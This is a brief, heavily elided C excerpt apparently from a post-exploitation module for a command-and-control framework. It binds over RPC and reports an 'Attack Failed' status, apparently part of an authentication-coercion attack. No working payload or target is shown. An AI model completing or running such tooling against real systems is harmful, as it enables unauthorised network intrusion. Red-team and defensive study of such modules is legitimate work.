...
LPWSTR ConvertToWideChar(const char* input) {
	...
	if (MultiByteToWideChar(CP_ACP, 0, input, -1, wideStr, size) == 0) {
...
void coffee( char ** argv, int argc, WCHAR** dispatch) {
	...
	if (rStatus != RPC_S_OK) {
		BadgerDispatch(dispatch, "[!] Error: RPC Binding failed...\n");
		return;
	}
	...
	if (hr != ERROR_BAD_NETPATH) {
		BadgerDispatch(g_dispatch, "[!] Attack Failed, error: %ld\n", hr);
	}
	else{
